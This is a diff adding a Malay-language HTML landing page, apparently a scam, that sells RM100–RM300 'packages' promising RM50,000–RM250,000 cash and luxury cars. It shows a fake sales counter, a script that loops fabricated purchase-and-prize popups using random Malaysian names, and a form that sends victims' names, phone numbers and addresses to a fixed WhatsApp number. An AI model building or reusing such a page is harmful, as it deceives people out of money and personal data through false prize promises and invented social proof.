@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pembayaran Rasmi</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins', sans-serif;
+}
+
+body{
+    background: linear-gradient(135deg, #ff1010, #ff0, #00c14f);
+}
+
+.wrapper{
+    max-width:420px;
+    margin:auto;
+    padding-bottom:30px;
+}
+
+/* QR */
+.qr-container{
+    background:#fff;
+    margin:20px;
+    padding:25px;
+    border-radius:20px;
+    text-align:center;
+    box-shadow:0 15px 40px rgba(0,0,0,0.25);
+}
+
+.qr-title{
+    font-size:24px;
+    font-weight:700;
+}
+
+.qr-sub{
+    font-size:13px;
+    color:#777;
+    margin-bottom:10px;
+}
+
+/* PROMO */
+.promo-banner{
+    background:#ff3b3b;
+    color:#fff;
+    font-size:12px;
+    font-weight:600;
+    padding:6px;
+    border-radius:8px;
+    margin-bottom:12px;
+    animation:blink 1s infinite;
+}
+
+@keyframes blink{
+    0%{opacity:1;}
+    50%{opacity:0.6;}
+    100%{opacity:1;}
+}
+
+.qr-container img{
+    width:220px;
+    border-radius:10px;
+}
+
+.qr-text{
+    font-size:12px;
+    color:#666;
+    margin-top:10px;
+}
+
+/* PACKAGE */
+.package{
+    margin-top:15px;
+    text-align:left;
+}
+
+.package-title{
+    font-size:15px;
+    font-weight:600;
+    margin-bottom:10px;
+}
+
+.package-item{
+    background:#f8f8f8;
+    padding:10px;
+    border-radius:12px;
+    margin-bottom:10px;
+    cursor:pointer;
+    border:2px solid transparent;
+    transition:0.3s;
+    position:relative;
+}
+
+.package-item:hover{
+    border-color:#00b14f;
+    background:#eefcf3;
+}
+
+.package-item.active{
+    border-color:#00b14f;
+    background:#e6fff0;
+}
+
+/* RADIO */
+.radio{
+    position:absolute;
+    right:12px;
+    top:12px;
+    width:18px;
+    height:18px;
+    border:2px solid #aaa;
+    border-radius:50%;
+}
+
+.package-item.active .radio{
+    border-color:#00b14f;
+    background:#00b14f;
+}
+
+.package-item strong{
+    color:#00b14f;
+}
+
+/* BADGE */
+.badge{
+    background:#ffcc00;
+    color:#000;
+    font-size:11px;
+    padding:4px 8px;
+    border-radius:6px;
+    display:inline-block;
+    margin-bottom:6px;
+    font-weight:600;
+}
+
+/* TOP BAR */
+.top-bar{
+    margin:0 20px;
+    background:rgba(255,255,255,0.1);
+    backdrop-filter: blur(10px);
+    color:#fff;
+    padding:12px;
+    border-radius:12px;
+    display:flex;
+    justify-content:space-between;
+    font-size;20px;
+}
+
+/* FORM */
+.form-container{
+    background:#fff;
+    margin:20px;
+    padding:20px;
+    border-radius:20px;
+    box-shadow:0 15px 40px rgba(0,0,0,0.25);
+}
+
+.form-header{
+    text-align:center;
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:20px;
+}
+
+.form-group{
+    margin-bottom:15px;
+}
+
+.label{
+    font-size:13px;
+    font-weight:600;
+}
+
+.input-field{
+    width:100%;
+    padding:12px;
+    border-radius:8px;
+    border:1px solid #ddd;
+    margin-top:5px;
+}
+
+.phone-container{
+    display:flex;
+    border:1px solid #ddd;
+    border-radius:8px;
+}
+
+.country-code{
+    padding:12px;
+    background:#f2f2f2;
+}
+
+.phone-input{
+    flex:1;
+    border:none;
+    padding:12px;
+}
+
+/* BUTTON */
+.save-btn{
+    width:100%;
+    background:linear-gradient(135deg,#00b14f,#00d563);
+    border:none;
+    padding:15px;
+    border-radius:12px;
+    color:#fff;
+    font-weight:700;
+    font-size:16px;
+    cursor:pointer;
+}
+
+/* NOTE */
+.privacy-note{
+    font-size:12px;
+    color:#777;
+    text-align:center;
+    margin:15px 0;
+}
+
+/* POPUP */
+.popup{
+    position:fixed;
+    bottom:20px;
+    left:20px;
+    background:#fff;
+    padding:12px 15px;
+    border-radius:10px;
+    box-shadow:0 10px 25px rgba(0,0,0,0.2);
+    font-size:12px;
+    max-width:250px;
+    display:none;
+    animation:fadeIn 0.5s ease;
+}
+
+@keyframes fadeIn{
+    from{opacity:0; transform:translateY(20px);}
+    to{opacity:1; transform:translateY(0);}
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+<!-- QR -->
+<div class="qr-container">
+    <div class="qr-title">Gadis QS</div>
+    <div class="qr-sub">Pembayaran Selamat & Disahkan</div>
+
+    <div class="promo-banner">
+        🔴 PROMOSI TERHAD BULAN INI SAHAJA
+    </div>
+
+                                            
+
+    <div class="package">
+        <div class="package-title">Pilihan Pakej:</div>
+
+        <div class="package-item" onclick="pilihPakej(this, 'Pakej Biasa RM100')">
+            <div class="radio"></div>
+            • Beli <strong>Pakej Biasa RM100</strong><br>
+            Layak menerima wang tunai RM50,000 serta berpeluang memenangi 1 unit Honda H-RV
+        </div>
+
+        <div class="package-item active" onclick="pilihPakej(this, 'Pakej Sedang RM200')">
+            <div class="radio"></div>
+            <div class="badge">⭐ Paling Popular di Malaysia</div>
+            • Beli <strong>Pakej Sedang RM200</strong><br>
+            Layak menerima wang tunai RM100,000 serta berpeluang memenangi 1 unit Toyota Alphard
+        </div>
+
+        <div class="package-item" onclick="pilihPakej(this, 'Pakej Combo RM300')">
+            <div class="radio"></div>
+            • Beli <strong>Pakej Combo RM300</strong><br>
+            Layak menerima 1 unit Toyota Alphard serta berpeluang memenangi wang tunai RM100,000 hingga RM250,000
+        </div>
+
+    </div>
+</div>
+
+<!-- TOP -->
+<div class="top-bar">
+    <div>← Kembali</div>
+    <div>🔥 568 unit telah terjual</div>
+    <div>✕</div>
+</div>
+
+<!-- FORM -->
+<div class="form-container">
+
+<div class="form-header">Maklumat Penghantaran</div>
+
+<div class="form-group">
+<label class="label">Nama penuh</label>
+<input type="text" id="nama" class="input-field" placeholder="Masukkan nama penuh">
+</div>
+
+<div class="form-group">
+<label class="label">Nombor telefon</label>
+<div class="phone-container">
+<div class="country-code">+60</div>
+<input type="tel" id="phone" class="phone-input" placeholder="Contoh: 0123456789">
+</div>
+</div>
+
+<div class="form-group">
+<label class="label">Alamat penghantaran</label>
+<input type="text" id="alamat" class="input-field" placeholder="Masukkan alamat penuh">
+</div>
+
+<div class="form-group">
+<label class="label">Butiran tambahan</label>
+<input type="text" id="detail" class="input-field" placeholder="Contoh: Rumah pagar putih">
+</div>
+
+<div class="privacy-note">
+Maklumat anda adalah sulit dan dilindungi sepenuhnya.
+</div>
+
+<button class="save-btn" onclick="kirimWhatsApp()">Sahkan & Hantar</button>
+
+</div>
+
+<!-- POPUP NOTIFIKASI -->
+<div id="popup" class="popup">
+    <div class="popup-content" id="popupText"></div>
+</div>
+</div>
+
+<script>
+var pakejDipilih = "Pakej Sedang RM200";
+
+function pilihPakej(el, pakej){
+    var items = document.querySelectorAll(".package-item");
+    items.forEach(i => i.classList.remove("active"));
+    el.classList.add("active");
+    pakejDipilih = pakej;
+}
+
+function kirimWhatsApp() {
+    var nama = document.getElementById("nama").value;
+    var phone = document.getElementById("phone").value;
+    var alamat = document.getElementById("alamat").value;
+    var detail = document.getElementById("detail").value;
+
+    if(nama === "" || phone === "" || alamat === ""){
+        alert("Sila lengkapkan semua maklumat yang diperlukan.");
+        return;
+    }
+
+    var nomorTujuan = "601169688547";
+
+    var pesan = "PESANAN BARU%0A%0A"
+              + "Pakej Dipilih: " + pakejDipilih + "%0A"
+              + "Nama: " + nama + "%0A"
+              + "Telefon: " + phone + "%0A"
+              + "Alamat: " + alamat + "%0A"
+              + "Butiran: " + detail;
+
+    var url = "https://wa.me/" + nomorTujuan + "?text=" + pesan;
+
+    window.open(url, "_blank");
+}
+</script>
+
+<script>
+var namaList = ["Ahmad", "Siti", "Rahman", "Nurul", "Faiz", "Aisyah", "Hafiz", "Amira"];
+var lokasiList = ["Johor", "Selangor", "Kuala Lumpur", "Melaka", "Perak", "Kedah"];
+var pakejList = ["Pakej Biasa RM100", "Pakej Sedang RM200", "Pakej Combo RM300"];
+
+function showPopup(){
+    var nama = namaList[Math.floor(Math.random()*namaList.length)];
+    var lokasi = lokasiList[Math.floor(Math.random()*lokasiList.length)];
+    var pakej = pakejList[Math.floor(Math.random()*pakejList.length)];
+
+    var text = nama + " dari " + lokasi + 
+               " telah membuat pembelian (" + pakej + 
+               ") dan telah menerima hadiah.";
+
+    var popup = document.getElementById("popup");
+    var popupText = document.getElementById("popupText");
+
+    popupText.innerText = text;
+    popup.style.display = "block";
+
+    setTimeout(function(){
+        popup.style.display = "none";
+    }, 4000);
+}
+
+// auto loop
+setInterval(showPopup, 6000);
+</script>
+</body>
+  </html>
